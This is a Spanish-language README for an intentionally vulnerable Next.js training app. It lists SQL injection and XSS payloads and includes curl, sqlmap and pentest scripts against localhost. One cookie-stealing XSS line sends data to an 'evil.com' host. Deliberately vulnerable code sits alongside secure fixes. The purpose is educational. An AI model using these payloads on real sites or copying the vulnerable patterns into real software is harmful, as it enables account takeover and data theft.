# 🔥 VulnSite - Plataforma Avanzada de Testing de Vulnerabilidades Web

[![Next.js](https://img.shields.io/badge/Next.js-15.5.4-black?style=for-the-badge&logo=next.js)](https://nextjs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
[![SQLite](https://img.shields.io/badge/SQLite-3.0-003B57?style=for-the-badge&logo=sqlite)](https://sqlite.org/)
[![TailwindCSS](https://img.shields.io/badge/Tailwind-3.0-38B2AC?style=for-the-badge&logo=tailwind-css)](https://tailwindcss.com/)

## ⚠️ ADVERTENCIA CRÍTICA

**🚨 ESTA APLICACIÓN CONTIENE VULNERABILIDADES INTENCIONALES 🚨**

Esta plataforma está diseñada específicamente para:
- 🎓 **Educación en ciberseguridad** y pentesting
- 🛡️ **Demostración de técnicas** de ataque web
- 🔧 **Desarrollo de herramientas** de seguridad
- 🔍 **Detección de vulnerabilidades** web

**NUNCA uses estos patrones en aplicaciones de producción.**

---

## 🎯 Descripción

VulnSite es una aplicación web vulnerable desarrollada con **Next.js** que simula un entorno real con múltiples tipos de vulnerabilidades web. Está diseñada para fines educativos en ciberseguridad y para el desarrollo de herramientas de detección de vulnerabilidades.

### 🌟 Características Principales

- ⚡ **Interface moderna** con dark mode profesional
- 🔴 **SQL Injection** avanzado con múltiples técnicas
- 🔵 **Cross-Site Scripting (XSS)** en diferentes contextos
- 📊 **Base de datos SQLite** con datos realistas
- 🎮 **Laboratorios interactivos** para cada vulnerabilidad
- 📱 **Responsive design** optimizado para pentesting

## 🚀 Instalación y Configuración

### Prerrequisitos

- **Node.js** >= 18.0.0
- **npm** >= 9.0.0
- **Sistema Operativo**: Windows, macOS, Linux

### Instalación Rápida

```bash
# Clonar el repositorio
git clone https://github.com/tu-usuario/vuln-ai-expose.git
cd vuln-ai-expose

# Instalar dependencias
npm install

# Reconstruir módulos nativos (si es necesario)
npm rebuild better-sqlite3

# Inicializar la base de datos
npm run build

# Iniciar en modo desarrollo
npm run dev
```

### Variables de Entorno (Opcional)

```env
# .env.local
PORT=3000
NODE_ENV=development
```

🌐 **La aplicación estará disponible en `http://localhost:3000`**

## 🔓 Laboratorios de Vulnerabilidades

### 🔴 SQL Injection Avanzado

#### 🔐 Authentication Bypass (`/sqli/login`)
- **🎯 Objetivo**: Eludir la autenticación sin credenciales válidas
- **🔗 Endpoint**: `/api/auth/login`
- **⚡ Técnicas**: Boolean-based, Union-based
- **💥 Payloads críticos**:
  ```sql
  admin' --                           # Bypass de contraseña
  ' OR '1'='1' --                    # Condición siempre verdadera
  admin' OR 1=1 #                    # Comentario MySQL
  x' UNION SELECT username,password FROM users --
  ```
- **👥 Usuarios de prueba**: `admin/admin123`, `user1/password123`

#### 🔍 Data Extraction (`/sqli/search`)
- **🎯 Objetivo**: Extraer datos sensibles de la base de datos
- **🔗 Endpoint**: `/api/search`
- **⚡ Técnicas**: Union-based, Boolean-based, Error-based, Time-based
- **💥 Payloads avanzados**:
  ```sql
  ' UNION SELECT id,username,password,email FROM users --
  ' AND (SELECT LENGTH(database()))>5 --           # Boolean-based
  ' AND EXTRACTVALUE(1,CONCAT(':',(SELECT version())))--  # Error-based
  ' OR SLEEP(5) --                                 # Time-based
  ' UNION SELECT table_name,column_name FROM information_schema.columns --
  ```

#### 👥 User Enumeration (`/sqli/users`)
- **🎯 Objetivo**: Enumerar usuarios y escalar privilegios
- **🔗 Endpoint**: `/api/users`
- **⚡ Técnicas**: Parameter injection, Privilege escalation
- **💥 Payloads de escalada**:
  ```sql
  # ID Filter
  1 OR 1=1
  1 UNION SELECT 1,2,3,4,5

  # Username Filter
  ' OR '1'='1
  admin' UNION SELECT username,password,email,role,created_at FROM users --

  # Role Filter
  admin' UNION SELECT * FROM users WHERE role='admin' --
  ```

### 🔵 Cross-Site Scripting (XSS)

#### ⚡ XSS Laboratory (`/xss/playground`)
- **🎯 Objetivo**: Explorar múltiples vectores de XSS
- **⚡ Tipos implementados**:
  - **Stored XSS**: Persistente en base de datos
  - **Reflected XSS**: Reflejado en respuesta inmediata
  - **DOM-based XSS**: Manipulación del DOM cliente
- **💥 Payloads por categoría**:
  ```html
  <!-- Básicos -->
  <script>alert('XSS')</script>
  <img src="x" onerror="alert(1)">
  <svg onload="alert('SVG XSS')">

  <!-- Avanzados -->
  <iframe src="javascript:alert('Frame XSS')">
  <details open ontoggle="alert('Details XSS')">
  <input onfocus="alert('Focus XSS')" autofocus>
  ```

#### 💬 Persistent Comments (`/xss/comments`)
- **🎯 Objetivo**: XSS persistente en sistema de comentarios
- **🔗 Endpoint**: `/api/comments`
- **⚡ Impacto**: Afecta a todos los usuarios que visiten la página
- **💥 Payloads especializados**:
  ```html
  <script>document.cookie='stolen='+document.cookie</script>
  <img src=x onerror="fetch('/api/steal?cookie='+document.cookie)">
  <svg/onload="location.href='//evil.com?'+document.cookie">
  ```

#### 👤 Profile Injection (`/xss/profile`)
- **🎯 Objetivo**: XSS en múltiples campos de perfil
- **⚡ Tipos**: Stored XSS + Reflected XSS
- **🎭 Campos vulnerables**:
  - Nombre, Biografía, Website, Ubicación
  - Búsqueda de perfiles (reflected)
- **💥 Vectores de ataque**:
  ```html
  <!-- En nombre -->
  <script>alert('XSS en nombre')</script>

  <!-- En biografía -->
  <img src="x" onerror="alert('XSS en bio')">

  <!-- En website -->
  <a href="javascript:alert('XSS en web')">Click aquí</a>

  <!-- En ubicación -->
  <svg onload="alert('XSS en ubicación')">
  ```

---

## 🏗️ Arquitectura del Sistema

### 🎨 Stack Tecnológico

| Componente | Tecnología | Versión | Propósito |
|------------|------------|---------|-----------|
| **Frontend** | Next.js | 15.5.4 | React framework con App Router |
| **Backend** | API Routes | Next.js | Endpoints vulnerables |
| **Base de Datos** | SQLite | 3.0 | Persistencia con better-sqlite3 |
| **Estilos** | TailwindCSS | 3.0 | Dark mode profesional |
| **Lenguaje** | TypeScript | 5.0 | Tipado estático |
| **Runtime** | Node.js | 18+ | Entorno de ejecución |

### 📁 Estructura del Proyecto

```
vuln-ai-expose/
├── 📱 app/
│   ├── 🔌 api/                    # API Routes vulnerables
│   │   ├── auth/login/            # Autenticación SQL injection
│   │   ├── search/                # Búsqueda con inyección
│   │   ├── users/                 # Enumeración usuarios
│   │   └── comments/              # Sistema comentarios XSS
│   ├── 🧩 components/             # Componentes React vulnerables
│   │   ├── VulnerableLogin.tsx    # Formulario de login
│   │   ├── VulnerableSearch.tsx   # Búsqueda vulnerable
│   │   ├── XSSPlayground.tsx      # Laboratorio XSS
│   │   └── VulnerableComment.tsx  # Comentarios con XSS
│   ├── 🔴 sqli/                   # Laboratorios SQL Injection
│   │   ├── login/                 # Authentication bypass
│   │   ├── search/                # Data extraction
│   │   └── users/                 # User enumeration
│   ├── 🔵 xss/                    # Laboratorios XSS
│   │   ├── playground/            # XSS interactivo
│   │   ├── comments/              # Comentarios persistentes
│   │   └── profile/               # Profile injection
│   └── 🏠 page.tsx                # Página principal
├── 📚 lib/
│   └── database.ts                # Configuración SQLite
├── 🔧 middleware.ts               # Inicialización DB
└── 💾 vulnerabilities.db          # Base de datos SQLite
```

## 🗄️ Esquema de Base de Datos

### 📊 Tablas Principales

```sql
-- 👥 Usuarios del sistema
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE,
    password TEXT,           -- ⚠️ Sin hash (vulnerable)
    email TEXT,
    role TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- 🛍️ Catálogo de productos
CREATE TABLE products (
    id INTEGER PRIMARY KEY,
    name TEXT,
    description TEXT,
    price DECIMAL(10,2),
    category TEXT
);

-- 💬 Sistema de comentarios
CREATE TABLE comments (
    id INTEGER PRIMARY KEY,
    post_id INTEGER,
    author_name TEXT,
    content TEXT,            -- ⚠️ Sin sanitización (vulnerable)
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- 📝 Posts del blog
CREATE TABLE posts (
    id INTEGER PRIMARY KEY,
    title TEXT,
    content TEXT,
    author_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### 👥 Usuarios de Prueba

| 🔑 Username | 🔒 Password | 👤 Role | 🎯 Uso |
|-------------|-------------|---------|---------|
| `admin` | `admin123` | admin | Escalada de privilegios |
| `user1` | `password123` | user | Usuario estándar |
| `testuser` | `test123` | user | Testing general |
| `alice` | `alice456` | user | Casos de prueba |

### 📦 Datos de Ejemplo
- **🛍️ Productos**: Laptop, Mouse, Teclado, Monitor
- **💬 Comentarios**: Incluye payloads XSS preinstalados
- **📝 Posts**: Contenido de prueba para comentarios

---

## 🔌 API Endpoints Vulnerables

### 🔐 Autenticación

```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin' --",
  "password": "cualquier_cosa"
}
```

**Response exitoso**:
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@example.com",
    "role": "admin"
  }
}
```

### 🔍 Búsqueda Vulnerable

```http
GET /api/search?q=' UNION SELECT id,username,password,email FROM users --
```

**Response con datos expuestos**:
```json
{
  "success": true,
  "results": [
    {
      "id": "1",
      "name": "admin",
      "description": "admin123",
      "price": "admin@example.com"
    }
  ],
  "query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT id,username,password,email FROM users --%'"
}
```

### 👥 Enumeración de Usuarios

```http
GET /api/users?id=1 OR 1=1&username=admin&role=admin' UNION SELECT * FROM users --
```

### 💬 Comentarios XSS

```http
POST /api/comments
Content-Type: application/json

{
  "postId": 1,
  "authorName": "Hacker",
  "content": "<script>alert('Stored XSS')</script>"
}
```

---

## 🧪 Guía de Testing

### 🔴 Testing SQL Injection

#### Con curl
```bash
# Authentication bypass
curl -X POST "http://localhost:3000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1 --","password":"cualquiera"}'

# Data extraction
curl -X GET "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users%20--"

# User enumeration
curl -X GET "http://localhost:3000/api/users?id=1%20OR%201=1"
```

#### Con SQLMap
```bash
# Automated testing
sqlmap -u "http://localhost:3000/api/search?q=test" \
       --batch --dbs --tables --columns --dump

# Login form testing
sqlmap -u "http://localhost:3000/api/auth/login" \
       --data "username=test&password=test" \
       --method POST --batch
```

### 🔵 Testing XSS

#### Payloads básicos
```bash
# Stored XSS en comentarios
curl -X POST "http://localhost:3000/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"postId":1,"authorName":"Hacker","content":"<script>alert(\"XSS\")</script>"}'

# Reflected XSS en búsqueda
curl -X GET "http://localhost:3000/xss/profile?search=<script>alert('Reflected')</script>"
```

#### Con Burp Suite
1. Configura proxy en `http://localhost:8080`
2. Intercepta requests a la aplicación
3. Modifica payloads en tiempo real
4. Usa Intruder para automatizar

---

## 🎮 Casos de Uso

### 🔍 Para Desarrolladores de Herramientas de Seguridad

```python
# Ejemplo de scanner de vulnerabilidades
import requests

class VulnerabilityScanner:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url

    def test_sql_injection(self):
        payloads = [
            "' OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "admin' --"
        ]

        for payload in payloads:
            response = requests.post(f"{self.base_url}/api/auth/login",
                                   json={"username": payload, "password": "test"})

            if response.json().get("success"):
                print(f"🚨 SQL Injection detectado: {payload}")

    def test_xss(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('SVG')>"
        ]

        for payload in xss_payloads:
            response = requests.post(f"{self.base_url}/api/comments",
                                   json={"postId": 1, "authorName": "Test", "content": payload})

            if response.json().get("success"):
                print(f"🚨 XSS Stored detectado: {payload}")

# Uso
scanner = VulnerabilityScanner()
scanner.test_sql_injection()
scanner.test_xss()
```

### 🔍 Para Pentesters

```bash
#!/bin/bash
# Script de testing automatizado

TARGET="http://localhost:3000"

echo "🔍 Iniciando pentesting de VulnSite..."

# SQL Injection testing
echo "🔴 Testing SQL Injection..."
sqlmap -u "$TARGET/api/search?q=test" --batch --level 3 --risk 3

# XSS testing
echo "🔵 Testing XSS..."
echo "<script>alert('XSS')</script>" | \
curl -X POST "$TARGET/api/comments" \
     -H "Content-Type: application/json" \
     -d @-

# Directory enumeration
echo "📂 Directory enumeration..."
dirb $TARGET /usr/share/dirb/wordlists/common.txt

echo "✅ Pentesting completado"
```

### 🎓 Para Educadores

```javascript
// Comparación de código vulnerable vs seguro

// ❌ VULNERABLE (como en VulnSite)
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  const user = db.prepare(query).get();

  if (user) {
    res.json({ success: true, user });
  } else {
    res.json({ success: false, message: 'Invalid credentials' });
  }
});

// ✅ SEGURO (implementación correcta)
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;

  // Validación de entrada
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Missing credentials' });
  }

  // Prepared statement
  const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?');
  const user = stmt.get(username, password);

  if (user) {
    // No exponer información sensible
    const { password: _, ...safeUser } = user;
    res.json({ success: true, user: safeUser });
  } else {
    res.json({ success: false, message: 'Invalid credentials' });
  }
});
```

---

## 🛡️ Contramedidas de Seguridad

### 🔴 Prevención SQL Injection

```typescript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ SEGURO
const stmt = db.prepare('SELECT * FROM users WHERE username = ?');
const user = stmt.get(username);
```

### 🔵 Prevención XSS

```typescript
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ SEGURO
<div>{userInput}</div> // React escapa automáticamente

// O con sanitización
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### 🔒 Medidas Generales

- **🔐 Prepared Statements**: Para todas las consultas SQL
- **🧹 Input Validation**: Validar todos los inputs del usuario
- **🛡️ Content Security Policy**: Implementar CSP estrictas
- **🍪 HTTPOnly Cookies**: Para prevenir acceso desde JavaScript
- **🔒 HTTPS**: Obligatorio en producción
- **⏱️ Rate Limiting**: Prevenir ataques automatizados

---

## 📚 Recursos Adicionales

### 📖 Documentación OWASP
- [🏆 OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [💉 SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [⚡ XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [🔒 Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

### 🛠️ Herramientas de Testing
- **SQLMap**: Automated SQL injection testing
- **Burp Suite**: Professional web security testing
- **OWASP ZAP**: Free security testing proxy
- **Nikto**: Web server scanner
- **Nuclei**: Vulnerability scanner

### 📚 Libros Recomendados
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "Real-World Bug Hunting" - Peter Yaworski
- "Web Security Testing Cookbook" - Paco Hope

---

## ⚖️ Ética y Responsabilidad

### ✅ Uso Permitido
- 🎓 **Educación**: Aprendizaje de ciberseguridad
- 🔬 **Investigación**: Desarrollo de herramientas de seguridad
- 🔍 **Pentesting**: Testing interno autorizado
- 🏢 **Corporate**: Evaluaciones de seguridad internas

### ❌ Uso Prohibido
- 🚫 **Ataques reales**: Contra sistemas en producción
- ⚖️ **Actividades ilegales**: Violación de leyes locales
- 🔓 **Acceso no autorizado**: Sin permiso explícito
- 💰 **Fines maliciosos**: Daño o beneficio ilícito

### 📋 Descargo de Responsabilidad
Los desarrolladores de VulnSite no se hacen responsables del uso indebido de esta herramienta. El usuario es completamente responsable de cumplir con las leyes locales e internacionales de ciberseguridad.

---

## 🤝 Contribución

### 🔧 Agregar Nuevas Vulnerabilidades

```typescript
// Ejemplo: Implementar IDOR
app.get('/api/admin/user/:id', (req, res) => {
  // ⚠️ Sin validación de autorización
  const userId = req.params.id;
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
  res.json({ success: true, user });
});
```

### 📝 Guidelines para PRs
1. 🍴 Fork el repositorio
2. 🌿 Crea rama: `git checkout -b feature/new-vulnerability`
3. 📚 Documenta la vulnerabilidad en README
4. 💥 Incluye payloads de ejemplo
5. 🛡️ Agrega contramedidas recomendadas
6. 🧪 Añade casos de prueba

---

## 📈 Roadmap

### 🚀 Próximas Vulnerabilidades
- [ ] **🔑 IDOR** (Insecure Direct Object References)
- [ ] **🔄 CSRF** (Cross-Site Request Forgery)
- [ ] **📄 XXE** (XML External Entity)
- [ ] **🌐 SSRF** (Server-Side Request Forgery)
- [ ] **📤 File Upload** vulnerabilities
- [ ] **🔓 Deserialization** attacks
- [ ] **🔍 Open Redirect**
- [ ] **💾 NoSQL Injection**

### 🔧 Mejoras Técnicas
- [ ] **🐳 Docker** containerization
- [ ] **📊 Metrics Dashboard** para vulnerabilidades
- [ ] **🎮 Challenge Mode** gamificado
- [ ] **🔌 API** para integración con herramientas
- [ ] **📱 Mobile** responsive improvements
- [ ] **🔗 OWASP ZAP** integration

---

## 📄 Licencia

Este proyecto está bajo la **Licencia MIT**. Ver el archivo [LICENSE](LICENSE) para más detalles.

**⚠️ IMPORTANTE**: Esta licencia NO autoriza el uso malicioso de las vulnerabilidades implementadas.

---

## 📞 Contacto y Soporte

### 👨‍💻 Mantenedor Principal
- **GitHub**: [@tu-usuario](https://github.com/tu-usuario)
- **Email**: security@tu-dominio.com
- **LinkedIn**: [Tu Perfil](https://linkedin.com/in/tu-perfil)

### 🐛 Reportar Issues
- **🪲 Bugs**: [GitHub Issues](https://github.com/tu-usuario/vuln-ai-expose/issues)
- **🔒 Vulnerabilidades**: security@tu-dominio.com
- **💡 Sugerencias**: [GitHub Discussions](https://github.com/tu-usuario/vuln-ai-expose/discussions)

---

<div align="center">

### 🔥 VulnSite - Educando en Ciberseguridad de Forma Responsable 🔥

[![Made with ❤️ for Cybersecurity Education](https://img.shields.io/badge/Made%20with-❤️%20for%20Cybersecurity%20Education-red?style=for-the-badge)](https://github.com/tu-usuario/vuln-ai-expose)

**⭐ Si este proyecto te ayuda en tu aprendizaje, ¡dale una estrella! ⭐**

</div>

## 🧪 Testing con Curl

### SQL Injection Examples

```bash
# Login bypass
curl -X POST "http://localhost:3000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1 --","password":"cualquiera"}'

# Búsqueda con injection
curl -X GET "http://localhost:3000/api/search?q=%27%20OR%201=1%20--"

# UNION injection en usuarios
curl -X GET "http://localhost:3000/api/users?username=%27%20UNION%20SELECT%201,2,3,4,5%20--"
```

### XSS Examples

```bash
# Comentario con XSS
curl -X POST "http://localhost:3000/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"postId":1,"authorName":"Hacker","content":"<script>alert(\"Stored XSS\")</script>"}'
```

## 🔧 Configuración Técnica

### Dependencias Principales
- **Next.js 15.5.4**: Framework React
- **better-sqlite3**: Base de datos SQLite
- **TailwindCSS**: Estilos
- **TypeScript**: Tipado estático

### Configuración de Seguridad Deshabilitada

⚠️ **Para propósitos educativos, se han deshabilitado intencionalmente**:
- Content Security Policy (CSP)
- Validación de entrada
- Sanitización de HTML
- Prepared statements
- Rate limiting
- HTTPS enforcement
- Secure headers

## 📚 Recursos de Aprendizaje

### SQL Injection
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### XSS
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## ⚠️ Disclaimer

Esta aplicación está diseñada exclusivamente para:
- **Educación en seguridad web**
- **Testing de herramientas de seguridad**
- **Detección de vulnerabilidades**
- **Demostraciones controladas**

**NUNCA uses estos patrones en aplicaciones reales o de producción.**

## 📄 Licencia

Este proyecto es solo para fines educativos. Usar bajo tu propia responsabilidad.
